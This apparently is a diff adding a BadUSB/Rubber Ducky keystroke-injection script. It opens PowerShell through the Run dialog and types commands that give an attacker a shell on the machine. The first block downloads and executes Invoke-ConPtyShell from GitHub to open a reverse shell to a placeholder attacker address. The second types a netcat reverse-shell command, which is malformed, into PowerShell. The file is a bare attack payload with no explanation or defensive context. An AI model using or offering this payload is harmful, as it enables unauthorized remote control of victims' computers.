@@ -1,0 +1,20 @@
+GUI r
+DELAY 500
+STRING Powershell
+DELAY 500
+ENTER
+DELAY 1000
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ip adress of attacker> <port number>
+DELAY 1000
+ENTER
+
+
+GUI r
+DELAY 500
+STRING Powershell
+DELAY 500
+ENTER
+DELAY 1000
+STRING nc -e /bin/bash/ <ip adress of attacker> <port number>
+DELAY 1000
+ENTER
